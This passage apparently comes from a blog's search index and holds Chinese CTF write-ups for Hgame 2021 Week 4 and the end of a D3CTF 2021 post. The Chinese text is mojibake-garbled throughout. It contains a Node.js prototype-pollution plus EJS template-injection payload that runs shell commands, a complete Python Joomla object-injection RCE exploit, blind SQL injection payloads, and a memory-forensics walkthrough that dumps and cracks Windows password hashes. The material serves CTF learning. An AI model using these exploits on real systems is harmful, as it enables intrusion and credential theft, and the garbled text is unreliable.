çš„å·¥å…·ï¼Œè¿˜èƒ½åŒæ—¶æ‰“å¼€ç«¯å£ç›‘å¬ã€‚ etc. è¢«å¡ä½å¤ªéš¾å—äº†ï¼Œä¹‹åæœ‰ç©ºæœ‰æœºä¼šå†æ¥å¤ç°å§ã€‚ Pwn æœ‰é¢˜ QEMU é€ƒé€¸çš„ï¼Œå–µå–µä» misc çš„è§’åº¦æ¥çœ‹çš„ã€‚ é¢˜ç›®åœ¨ docker é‡Œæ­äº†ä¸ª QEMU è™šæ‹Ÿæœºã€‚flag åœ¨ docker é‡Œçš„ï¼ˆç›¸å¯¹äºè™šæ‹Ÿæœºçš„ï¼‰ host é‡Œï¼Œè¿æ¥å‘ç°é€šè¿‡ Ctrl-A C å¯ä»¥é€€å‡ºè™šæ‹Ÿæœºåˆ° monitorï¼ŒæŠŠ flag ä½œä¸ºå…‰é©±æŒ‚è½½ä¸Šå»ï¼Œä½† Ctrl-A C å†è¿›å»å‘ç°è¯»ä¸å‡ºæ¥ï¼Œçœ‹åˆ«äºº wp å‘ç°éœ€è¦å¾€è¿™ä¸ªé‡Œé¢å…ˆå†™å…¥å…¶ä»–å­—ç¬¦ä¸²ï¼Œè¶³å¤Ÿé•¿æ‰èƒ½è¾“å‡ºã€‚ç„¶è€Œæœ‰ç‚¹é—®é¢˜è¿™ä¹ˆæ‰“æ²¡æ‰“é€šï¼Œæœ€åé˜Ÿå‹ç”¨ binary çš„æ–¹æ³•æ‰“é€šäº†ï¼Œ233333. å¤ªé¡¶äº†å¤ªé¡¶äº†ï¼ å–µå‘œå‘œå‘œå‘œå‘œï¼Œæˆ‘åªä¼šç­¾åˆ°ã€é—®å·å’Œè¿™é“æ¥æ¥å›å›çš„è™šæ‹Ÿæœºäº†â€¦â€¦ æŒ¤ä¸è¿›å‰20äº†ï¼Œå–µå–µå¤§å“­ã€‚ ä¸è¿‡æ‹¿äº†ä¸ªä¸€è¡€è¿˜æ˜¯æŒºçˆ½çš„ï¼ ä¸å¯¹åŠ²ï¼Œæœ¬æ¥è¯´ç€éšæ„å†™å†™çš„ï¼Œæ€ä¹ˆæ‰¯äº†è¿™ä¹ˆå¤šï¼ˆ ï¼ˆæºœäº†æºœäº† å™¢ï¼ŒOfficial Writeup ç»ˆäºå‡ºæ¥äº†ï¼ https://github.com/D-3CTF/D3CTF-2021-Official-Writeup","path":"2021/03/09/CTF_2021Ant-D3CTF/"},{"title":"CTF | 2021 Hgame Week4 WriteUp","text":"å¼•è¨€Hgame 2021 Week 4 å–µå‘œï¼Œè½¬çœ¼é—´ Hgame å°±åˆ°äº†æœ€åä¸€å‘¨ï¼Œå¯’å‡ä¹Ÿç»“æŸäº†ã€‚ è¿™å‘¨é¢˜ç›®å¥½éš¾å•Šï¼Œè¿˜æœ‰å°±æ”¶å‡äº†æ¯”è¾ƒå¿™ï¼Œåé¢å°±æ²¡æ—¶é—´çœ‹é¢˜äº†ã€‚ é—®é¢˜ä¸å¤§ï¼ˆå–µå–µçˆ¬èµ° Webæ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥ åœ¨æˆ‘é•¿å¤§çš„è¿™ä¸ªåŸå¸‚é‡Œï¼Œæ¯ä¸ªäººéƒ½æœ‰è¶…è¶Šå¯»å¸¸çš„ç‰¹é•¿ã€‚æˆ‘å¯ä»¥é‡å¯è¿™ä¸ªä¸–ç•Œï¼ˆæ˜¯çš„æ•´ä¸ªä¸–ç•Œï¼‰ï¼Œä¸ä»…ä»…æ˜¯å°†æ—¶é’Ÿå¾€å›æ‹¨ï¼Œè€Œæ˜¯å°†ä¸–ç•Œçš„ä¸€åˆ‡ï¼Œä»åŸå­å±‚é¢æ¢å¤åˆ°ä¸€å¤©å‰çš„çŠ¶æ€ã€‚åªæœ‰çœ‹åˆ°æœ‰äººåœ¨å“­æ³£æ—¶ï¼Œæˆ‘æ‰ä¼šé‡å¯ã€‚åŒ…æ‹¬æˆ‘çš„è®°å¿†ï¼Œå…¨éƒ¨é‡å¯ã€‚ä½†æ˜¯ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘çš„æ­æ¡£æœ‰ç»å¯¹è®°å¿†ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬è¢«å›°åœ¨äº†è¿™ä¸€å¤©é‡Œï¼Œæ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥ã€‚æœ‰æƒ…æŠ¥è¯´ï¼Œåªè¦æˆ‘ä»¬é‡å¯äº†è¿™ä¸€å¤©ï¼Œâ€œMacGuffinâ€ ä¾¿ä¼šå‡ºç°åœ¨æˆ‘ä»¬é¢å‰ï¼Œå¹¶ä¸”å®ƒä¼šæ»¡è¶³æˆ‘ä»¬çš„ä»»ä½•æ„¿æœ›ã€‚ http://macguffin.0727.site:5000/ æç¤ºæœ‰æºç ã€‚ ä¸‹è½½ä¸‹æ¥ä¸€çœ‹ï¼Œå•Š NodeJSï¼Œå¥½è€¶ï¼ app.js const express = require('express') const bodyParser = require('body-parser') const session = require('express-session') const randomize = require('randomatic') const ejs = require('ejs'); const path = require(\"path\"); const app = express() app.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json()) app.use('/static', express.static('static')) app.use(session({ name: 'session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false })) app.set('views', './views') app.set('view engine', 'ejs') app.all('/', (req, res) =&gt; { let data = { name: \"\", discription: \"\" } if (req.ip === \"::ffff:127.0.0.1\") { data.crying = true } if (req.method == 'POST') { Object.keys(req.body).forEach((key) =&gt; { if (key !== \"crying\") { data[key] = req.body[key] } }) req.session.crying = data.crying req.session.name = data.name req.session.discription = data.discription return res.redirect(302, '/show'); } return res.render('loop') }) app.all('/show', (req, res) =&gt; { if (!req.session.name || !req.session.discription) { return res.redirect(302, '/'); } let wishes = req.session.wishes ? req.session.wishes : \"\" return res.render('show', { name: req.session.name, discription: req.session.discription, wishes: wishes }) }) app.all('/wish', (req, res) =&gt; { if (!req.session.crying) { return res.send(\"forbidden.\") } if (req.method == 'POST') { let wishes = req.body.wishes req.session.wishes = ejs.render(`&lt;div class=\"wishes\"&gt;${wishes}&lt;/div&gt;`) return res.redirect(302, '/show'); } return res.render('wish'); }) app.listen(3000, () =&gt; console.log(`App start on port 3000!`)) show.ejs &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"static/css/bootstrap.min.css\"&gt; &lt;link rel=\"stylesheet\" href=\"static/css/show.css\"&gt; &lt;title&gt;SHOW&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"main-box\" translate=\"no\"&gt; &lt;div class=\"content-card\"&gt; &lt;ol class=\"articles\"&gt; &lt;li class=\"articles__article\" style=\"--animation-order:1\"&gt; &lt;a class=\"articles__link\"&gt; &lt;div class=\"articles__content articles__content--lhs\"&gt; &lt;h2 class=\"articles__title\"&gt; &lt;%= discription %&gt; &lt;/h2&gt; &lt;div class=\"articles__footer\"&gt; &lt;p&gt; &lt;%= name %&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"articles__content articles__content--rhs\" aria-hidden=\"true\"&gt; &lt;h2 class=\"articles__title\"&gt; &lt;%= discription %&gt; &lt;/h2&gt; &lt;div class=\"articles__footer\"&gt; &lt;p&gt; &lt;%= name %&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;/li&gt; &lt;/ol&gt; &lt;% if (wishes) { %&gt; &lt;%- wishes %&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;script src=\"static/js/jquery.min.js\"&gt;&lt;/script&gt; æ³¨æ„åˆ°å¤„ç† / è·¯ç”±çš„æ—¶å€™ï¼ŒæŠŠ body é‡Œé™¤äº† crying çš„ä¸œè¥¿éƒ½èµ‹å€¼ç»™ data äº†ï¼Œäºæ˜¯æƒ³åˆ°æ˜¯ åŸå‹é“¾æ±¡æŸ“ ã€‚ å›æ˜¾çš„è¯å¯ä»¥é€šè¿‡è¿™ä¸ª wishes æ¥è¿›è¡Œã€‚ éšæ„å‘ä¸ªåŒ…ï¼Œå¯ä»¥å‘ç°ç”¨çš„æ˜¯ application/x-www-form-urlencoded ä¼ å‚ã€‚ ä½†æ˜¯ä¸ºäº†æ„é€ åŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ objectï¼Œå¾ˆå¥½å®ƒåœ¨ç¬¬ 9 è¡Œè¿™é‡Œç”¨äº† jsonï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¹ä¸€ä¸‹ content-type æ±¡æŸ“äº†ã€‚ payload: {\"name\":\"meow\", \"discription\": \"MiaoTony\", \"__proto__\": {\"crying\": true}} ç„¶åè®¿é—® /wish å°±èƒ½å‘ç°æ­£å¸¸è®¿é—®è€Œæ²¡è¢«æ‹¦äº†ã€‚ åœ¨è¿™é‡Œå°±æ˜¯ ejs æ¨¡æ¿æ³¨å…¥ å•¦ã€‚ å‚è€ƒ ä¹‹å‰ NCTF 2020 çš„ payload. å—¯æ˜¯ä¸ªé€šç”¨çš„ payloadã€‚ &lt;%- global.process.mainModule.require('child_process').execSync('ls -al /') %&gt; æ‰“è¿‡å»ï¼Œå…ˆçœ‹çœ‹æ ¹ç›®å½•æœ‰å•¥ã€‚ å¾ˆå¥½ï¼Œçœ‹åˆ° flag äº†ã€‚ å†èµ°ä¸€éæµç¨‹è¯» flagã€‚ &lt;%- global.process.mainModule.require('child_process').execSync('cat /flag') %&gt; hgame{nOdeJs_Prot0type_ls_fUnny&amp;Ejs_Templ@te_Injection} joomlaJoomla!!!!! è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é¢˜ç›®æè¿°ã€‚é™„ä»¶ï¼šhttp://1.oss.hgame2021.vidar.club/joomlaJoomla.zip http://9bf30fbbcb.joomla.r4u.top:6788/ å•Š 2015 å¹´å·¨å¤è€çš„æ¡†æ¶äº†ã€‚ ä¸€æœå°±å‘ç°æœ‰ Session ååºåˆ—åŒ–æ¼æ´ã€‚ é€šè¿‡Joomlaçš„ä¸¤æ¬¡RCEæ¼æ´çœ‹sessionååºåˆ—åŒ– sessionååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ[Joomla RCE] BTW, PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“å¸¦æ¥çš„å®‰å…¨éšæ‚£ æˆ–è€… ç”¨ searchsploit æœä¸€ä¸‹ä¹Ÿèƒ½å‘ç°ã€‚ å°±æ˜¯ Joomla è‡ªå·±å®ç°äº†ä¸€ç§ session åºåˆ—åŒ–çš„æ ¼å¼ï¼Œé€šè¿‡ XFF æˆ–è€… User-Agent å¯ä»¥æ³¨å…¥åˆ°æ•°æ®åº“ã€‚ ç„¶è€Œç”¨ç°æˆçš„ exp ç›´æ¥æ‰“è¿‡å»å‘ç°æ‰“ä¸é€šã€‚ çœ‹æ–‡ä»¶ä¿®æ”¹æ—¥æœŸå°±èƒ½å‘ç°æ”¹äº†ä»£ç ã€‚ æ ¹æ® Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰ å¯¹æ¯”å‘ç°å¢åŠ äº†ä¸€éƒ¨åˆ†ä»£ç ã€‚ å¯ä»¥å‘ç°æŠŠç¬¬ä¸€ä¸ªå‡ºç°çš„ | ç»™æ›¿æ¢ä¸ºç©ºäº†ã€‚ é‚£æˆ‘ä»¬åœ¨ exp æœ€å¼€å§‹åŠ ä¸ª |ï¼Œæˆ–è€…åŒå†™ | å°±å®Œäº‹äº†ï¼ ç„¶åç”Ÿæˆ payloadï¼Œæ‹¿ flagã€‚ Python 2 ''' Simple PoC for Joomla Object Injection. Gary @ Sec-1 ltd http://www.sec-1.com/ ''' import requests # easy_install requests def get_url(url, user_agent): headers = { 'User-Agent': user_agent } cookies = requests.get(url,headers=headers).cookies for _ in range(3): response = requests.get(url, headers=headers,cookies=cookies) return response def php_str_noquotes(data): \"Convert string to chr(xx).chr(xx) for use in php\" encoded = \"\" for char in data: encoded += \"chr({0}).\".format(ord(char)) return encoded[:-1] def generate_payload(php_payload): php_payload = \"eval({0})\".format(php_str_noquotes(php_payload)) terminate = '\\xf0\\xfd\\xfd\\xfd' exploit_template = r'''|}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";''' injected_payload = \"{};JFactory::getConfig();exit\".format(php_payload) exploit_template += r'''s:{0}:\"{1}\"'''.format(str(len(injected_payload)), injected_payload) exploit_template += r''';s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}''' + terminate return exploit_template pl = generate_payload(\"system('cat /flag');\") # phpinfo(); print get_url(\"http://9bf30fbbcb.joomla.r4u.top:6788/\", pl).content hgame{WelCoME~TO-ThIs_Re4Lw0RLD} Unforgettable Liki æ›´æ–°äº†å¥¹çš„ TodoList, ç»ˆäºè®°ä½äº†å¾ˆå¤šä¸èƒ½å¿˜è®°çš„äº‹æƒ…PS: flag å†…å®¹ä¸­çš„å­—æ¯éƒ½ä¸ºå°å†™ï¼Œè¯·è‡ªè¡Œç”¨ hgame{} åŒ…è£¹å¾—åˆ°çš„ flag https://unforgettable.liki.link/ è¿™é¢˜å¾ˆå‘ï¼Œä¸æƒ³ä¸Šå‘¨é‚£æ ·å­˜åœ¨ Flask SSTI. è¯•äº†å¾ˆä¹…ï¼Œçªç„¶å‘ç°ç›¸æ¯”ä¸Šå‘¨å¤šäº†ä¸€ä¸ª user é¡µé¢ï¼Œå‘ç°è¿™ä¸ªé¡µé¢ä¸Šçš„ username å­˜åœ¨ SQL æ³¨å…¥ã€‚ è€Œå…¶ä»–é¡µé¢çš„å³ä¸Šè§’ username éƒ½æ˜¯æ­£å¸¸æ˜¾ç¤ºçš„ï¼ˆç”¨æˆ·ååŸæœ¬çš„æ¨¡æ ·ï¼‰ã€‚ è¿™ä¸ªå†™èµ·æ¥å°±å¾ˆéº»çƒ¦ï¼Œéœ€è¦æ³¨å†Œç”¨æˆ·ï¼Œç„¶åç™»å½•ï¼Œè®¿é—® /user. è¯•äº†ä¸€ä¸‹ username è¿‡æ»¤çš„è¿˜æŒºå¤šâ€¦â€¦åŒ…æ‹¬ä½†ä¸é™äº ç©ºæ ¼ = like and or ä¹‹ç±»çš„ã€‚ è¿˜æœ‰ä¸€å®šæƒ…å†µæ³¨å†ŒæˆåŠŸäº†ä½†è®¿é—® /user å¹¶æ²¡æœ‰å›æ˜¾ï¼Œåè€Œå°±æ˜¯ä¸ª usernameã€‚ åæ¥æ‰çŸ¥é“è¿™æ˜¯ SQL äºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥æ˜¯æŒ‡å·²å­˜å‚¨(æ•°æ®åº“ã€æ–‡ä»¶)çš„ç”¨æˆ·è¾“å…¥è¢«è¯»å–åå†æ¬¡è¿›å…¥åˆ° SQL æŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´çš„æ³¨å…¥ è¿™é¢˜ä¸­å°±æ˜¯ åœ¨ user é¡µé¢æœ‰ä¸ª SQL è¯­å¥ï¼Œè®¿é—®çš„æ—¶å€™æ‰æ‰§è¡ŒæŸ¥è¯¢ï¼Œä½†å°±èƒ½æ³¨å…¥äº†ã€‚ çè¯•äº†è¯•å‘ç°è¿˜æŠŠåˆ«äººçš„ç”¨æˆ·åç»™æ•´å‡ºæ¥äº†ã€‚2333 å•Šå‘ç°æœ‰ç°æˆçš„ payload äº†ã€‚å¥½è€¶ï¼ SeleCt'+'1+2 1HinrG'/**/&amp;&amp;/**/(IF(right(left((SELECT/**/GROUP_CONCAT(ffllllaaaagg)/**/FROM/**/ffflllaagggg),1),1)/**/IN/**/('''),BENCHMARK(55555555,MD5('a')),0))# SeleCt'+'5 5dPaU6'/**/&amp;&amp;/**/(IF(LENGTH((SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg))/**/IN/**/(2),BENCHMARK(55555555,MD5('a')),0))# å…¶å®å°±ç›²æ³¨ï¼Œå¸ƒå°”/æ—¶é—´ç›²æ³¨éƒ½è¡Œã€‚ è¦æ³¨å†Œç™»å½•æŒºéº»çƒ¦çš„å°±æ˜¯äº†ã€‚ ï¼ˆä¸è¿‡åæ¥å¯’å‡ä¹ˆå¾—äº† æ²¡ç©ºå†™è„šæœ¬äº† emmm MiscAkiraä¹‹ç³-1 æœ‰äººæƒ³é—® Akira ä¸ºä»€ä¹ˆæ€»å–œæ¬¢ç”¨çœ¼ç›å½“å¤´åƒï¼ŒAkira è¯´ï¼šâ€œæˆ‘ç»™ä½ è®²ä¸ªæ•…äº‹å§ï¼Œä»å‰æœ‰ä¸€å¤©ä¸€ä½åŸç”»å¸ˆåœ¨ä¸Šç­ï¼Œä¸å¹¸çš„æ˜¯çªç„¶èµ·äº†ç«ç¾ï¼Œæƒ…æ€¥ä¹‹ä¸‹ IT éƒ¨é—¨æŠŠå¥¹æ²¡ä¿å­˜çš„å·¥ä½œ dump äº†ä¸‹æ¥å¹¶ä¼ åˆ°äº†ç½‘ä¸Š â€¦â€¦ â€ https://1.oss.hgame2021.vidar.club/important_work_bf81f2db20bfa2045a4cd2f6e6214544.7z å†…å­˜å–è¯ 1GiB çš„å†…å­˜é•œåƒå•Šï¼Œå¥½å¤§ï¼ˆ $ volatility -f important_work.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (E:\\CTF\\test\\Hgame2021\\week4\\Misc_Akira-1\\important_work.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf8000403b0a0L Number of Processors : 16 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff8000403cd00L KPCR for CPU 1 : 0xfffff88004700000L KPCR for CPU 2 : 0xfffff88004776000L KPCR for CPU 3 : 0xfffff880047ec000L KPCR for CPU 4 : 0xfffff88004840000L KPCR for CPU 5 : 0xfffff880048b6000L KPCR for CPU 6 : 0xfffff8800492c000L KPCR for CPU 7 : 0xfffff880049a2000L KPCR for CPU 8 : 0xfffff880049d8000L KPCR for CPU 9 : 0xfffff88004a94000L KPCR for CPU 10 : 0xfffff88004b0a000L KPCR for CPU 11 : 0xfffff88004b80000L KPCR for CPU 12 : 0xfffff88004c00000L KPCR for CPU 13 : 0xfffff88004c76000L KPCR for CPU 14 : 0xfffff88004cec000L KPCR for CPU 15 : 0xfffff88004d62000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-02-18 09:47:25 UTC+0000 Image local date and time : 2021-02-18 17:47:25 +0800 Win7SP1x64 çœ‹çœ‹æ¡Œé¢ä¸Šæœ‰å•¥æ–‡ä»¶ã€‚ $ volatility -f important_work.raw --profile=Win7SP1x64 filescan | grep Desktop Volatility Foundation Volatility Framework 2.6 0x000000001ed735f0 5 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ec31eb0 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ec5c070 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210218-094722.raw 0x000000003ec703d0 18 2 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip 0x000000003ed28eb0 10 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\DumpIt.exe 0x000000003ed53070 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\HGAME2021-20210218-094722.raw 0x000000003ed673d0 18 2 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip 0x000000003f277bb0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\desktop.ini 0x000000003f278a40 2 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop\\desktop.ini 0x000000003f27a8c0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003f27aa90 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Public\\Desktop 0x000000003f287dd0 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f288c40 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f28edd0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003f28f440 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003f2906d0 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003f293070 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003f294600 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Games\\Desktop.ini 0x000000003f294a60 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x000000003f296ac0 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance\\Desktop.ini 0x000000003f297370 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Accessibility\\Desktop.ini 0x000000003f297f20 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\System Tools\\Desktop.ini 0x000000003f299c10 16 0 R--rwd \\Device\\HarddiskVolume1\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Tablet PC\\Desktop.ini 0x000000003f2e1a40 6 0 R--r-d \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe 0x000000003f2fa710 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f30b480 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop 0x000000003f4ca830 16 0 R--r-- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe 0x000000003f8e2dd0 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop ç„¶åæå–ä¸€ä¸‹çœ‹ä¸Šå»å…³é”®çš„ã€‚ $ volatility -f important_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003f4ca830 --dump-dir=./ -u Volatility Foundation Volatility Framework 2.6 ImageSectionObject 0x3f4ca830 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe DataSectionObject 0x3f4ca830 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\important_work.exe $ volatility -f important_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003ec703d0 --dump-dir=./ -u Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3ec703d0 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip SharedCacheMap 0x3ec703d0 None \\Device\\HarddiskVolume1\\Users\\Genga03\\Desktop\\work.zip å‹ç¼©åŒ…æ³¨é‡Šæç¤ºå¯†ç æ˜¯ sha256(login_password) äºæ˜¯å»å†…å­˜é‡Œæ‰¾å¯†ç ã€‚ å…ˆçœ‹çœ‹å†…å­˜ã€‚ $ volatility -f important_work.raw --profile=Win7SP1x64 hivelist Volatility Foundation Volatility Framework 2.6 Virtual Physical Name ------------------ ------------------ ---- 0xfffff8a001862010 0x000000003243d010 \\??\\C:\\System Volume Information\\Syscache.hve 0xfffff8a00000f010 0x000000000f972010 [no name] 0xfffff8a000024010 0x000000001b87d010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000053150 0x000000000fcad150 \\REGISTRY\\MACHINE\\HARDWARE 0xfffff8a0003b0010 0x000000000c21a010 \\SystemRoot\\System32\\Config\\DEFAULT 0xfffff8a000746010 0x0000000011518010 \\SystemRoot\\System32\\Config\\SOFTWARE 0xfffff8a00074e410 0x0000000011b0d410 \\Device\\HarddiskVolume1\\Boot\\BCD 0xfffff8a000b1b010 0x000000003c38f010 \\SystemRoot\\System32\\Config\\SECURITY 0xfffff8a000bc3410 0x000000003cd3c410 \\SystemRoot\\System32\\Config\\SAM 0xfffff8a000c06010 0x000000003bb46010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT 0xfffff8a000c8f410 0x000000003bc42410 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT 0xfffff8a00131e010 0x00000000067e6010 \\??\\C:\\Users\\Genga03\\ntuser.dat 0xfffff8a0013b0010 0x000000001b4bc010 \\??\\C:\\Users\\Genga03\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat ç„¶åæå–å¯†ç ã€‚ # volatility -f name --profile=Win7SP1x64 hashdump -y æ³¨å†Œè¡¨ system çš„ virtual åœ°å€ -s SAM çš„ virtual åœ°å€ $ volatility -f important_work.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 Volatility Foundation Volatility Framework 2.6 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436::: $ volatility -f important_work.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 &gt; pass.txt $ john pass.txt --format=NT ç”¨ john ç ´è§£å¾—åˆ°å¯†ç ä¸º asdqwe123 $ echo -n asdqwe123 &gt; test $ sha256sum test 20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3 test è§£å‹å¾—åˆ°ä¸¤å¼ å›¾ç‰‡ï¼Œå™¢ ç›²æ°´å° å•Šã€‚ ç”¨ GitHub ä¸Šçš„ BlindWaterMark æ¥æå–ç›²æ°´å°ã€‚ $ python bwmforpy3.py decode src.png Blind.png output.png æå–å‡ºæ¥çš„æœ‰ç‚¹æœ¦èƒ§ï¼Œç¨å¾®è°ƒä¸€ä¸‹å¯¹æ¯”åº¦ã€‚ hgame{7he_f1ame_brin9s_me_end1ess_9rief} å¥½è€¶ï¼è¹­è¿™ä¸ªæœºä¼šç»ˆäºå­¦äº†å­¦ volatility çš„ä½¿ç”¨ï¼ˆï¼ˆ Akiraä¹‹ç³-2 â€¦â€¦â€œæœ€åå‘¢ï¼Ÿâ€â€œæœ€åå¥¹è¿˜æ˜¯æ²¡èƒ½å¹¸å…ï¼Œäººä»¬åœ¨ä¿é™©ç®±æ—å‘ç°äº†å¥¹çƒ§ç„¦çš„å°¸ä½“ï¼Œæ‰“å¼€ä¿é™©ç®±äººä»¬å‘ç°äº†ä¸€ä¸ªUç›˜ï¼Œæ˜¯å¥¹å°†å›å®¶ç”»å¥½çš„åŸç¨¿å¸¦æ¥æ—¶ç”¨çš„ â€¦â€¦â€ https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z ï¼ˆæ€ä¹ˆè¿™ä¸ªé•œåƒè¿˜è¦å¤§å•Šï¼Œ2GiBâ€¦ ç…§æ ·çœ‹é•œåƒä¿¡æ¯ã€‚ $ volatility -f secret_work.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/mnt/hgfs/ctf/Hgame2021/week4/Misc_Akira-2/secret_work.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80003ff7120L Number of Processors : 16 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80003ff9000L KPCR for CPU 1 : 0xfffff88004500000L KPCR for CPU 2 : 0xfffff8800457d000L KPCR for CPU 3 : 0xfffff880009b9000L KPCR for CPU 4 : 0xfffff88004654000L KPCR for CPU 5 : 0xfffff880046d1000L KPCR for CPU 6 : 0xfffff8800474e000L KPCR for CPU 7 : 0xfffff880047cb000L KPCR for CPU 8 : 0xfffff88004848000L KPCR for CPU 9 : 0xfffff880048c5000L KPCR for CPU 10 : 0xfffff88004942000L KPCR for CPU 11 : 0xfffff880049bf000L KPCR for CPU 12 : 